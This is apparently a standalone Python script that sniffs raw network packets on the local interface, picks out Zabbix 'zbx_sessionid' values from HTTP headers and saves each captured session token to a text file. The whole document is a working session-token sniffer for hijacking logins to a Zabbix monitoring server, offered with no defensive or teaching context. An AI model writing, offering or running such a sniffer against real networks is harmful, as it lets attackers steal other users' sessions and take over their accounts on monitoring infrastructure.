import socket
import re

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))

print ("trying to catch zbx_sessionid")
k = ''
while True:
    data = s.recvfrom(65565)
    try:
        # s,m,k=''
        if "HTTP" in data[0][54:]:
            # print "[","="*30,']'
            raw = data[0][54:]
            if "\r\n\r\n" in raw:
                line = raw.split('\r\n\r\n')[0]
                print "[*] Header Captured "
                # print line[line.find('HTTP'):]
                value = line

                m = re.search("(zbx_sessionid.*)", value)
                if m:
                        # This is reached.
                        # print("search:", m.group(0))
                    str = m.group(0)
                    k = re.split(r'\W+', str)
                    print ("session_id is :")

                    print (k[1])
                    ####Saving founded zbx_sessionid in file
                    # print (date)
                    saved_zbxssids = open('zbx_sessionids.txt','a')
                    saved_zbxssids.write('\n')
                    # date = str(datetime.now())
                    saved_zbxssids.write(k[1]) # or whith date:  saved_zbxssids.write(k[1]+ '   ' + date)
                    saved_zbxssids.write('\n')
                    # saved_zbxssids.write(date)
                    saved_zbxssids.close()
                    print ("zabbix session id saved in file zbx_sessionids.txt")

                    # m = ''
                else:
                    pass
            # print raw
            else:
                # print '[{}]'.format(data)
                pass
    except KeyboardInterrupt:
        s.close()

